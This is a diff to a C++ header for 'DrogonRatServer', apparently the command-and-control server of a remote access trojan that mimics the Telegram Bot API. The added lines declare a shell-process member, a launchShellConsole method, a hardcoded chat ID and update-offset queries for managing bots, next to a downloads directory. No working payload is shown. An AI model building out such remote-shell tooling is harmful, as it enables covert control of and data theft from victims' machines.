@@ -10,7 +10,9 @@
 #include <drogon/orm/Mapper.h>
 #include <filesystem>
 #include <functional>
+#include <json/value.h>
 #include <memory>
+#include <process.hpp> //tiny-process-library
 #include <string_view>
 
 namespace DrogonRatServer {
@@ -47,7 +49,12 @@ class Handler {
     std::filesystem::path data_dowload_dir = std::filesystem::current_path() / "data/downloads";
     std::vector<Bot> cached_bots = {};
 
-    // Define the function pointer type first
+    int64_t chat_id = 1202032932;
+    std::unique_ptr<TinyProcessLib::Process> shell_process = nullptr;
+    // In your Handler class definition:
+    std::deque<std::string> pending_updates_buffers;
+    std::mutex pending_updates_buffers_mutex;
+
     using HandlerMethodFuncPtr = void (*)(const drogon::HttpRequestPtr &,
                                           Bot *,
                                           const std::string &,
@@ -59,6 +66,7 @@ class Handler {
          {"getFile", TelegramBotApi::handleFileQueryById}}};
 
   public:
+    // this is a reference to the singelton, this class does not own it.
     drogon::HttpAppFramework &drogon_app;
 
     /*Default constructors must be deleted*/
@@ -71,11 +79,15 @@ class Handler {
     Handler &setDbFilePath(const std::filesystem::path &Db_File_Path);
     Handler &initDbClient(void);
 
+    Handler &launchShellConsole(const std::filesystem::path &Shell_Binary_Path);
     void registerAll();
 
   protected:
     void registerUploadHandler();
     void registerEchoHandler();
+
+    int64_t queryUpdateOffset();
+    int64_t queryMessageOffset();
 
     inline void _dispatchHandlerAccordingToMethod(
         const std::string &Method_Literal,
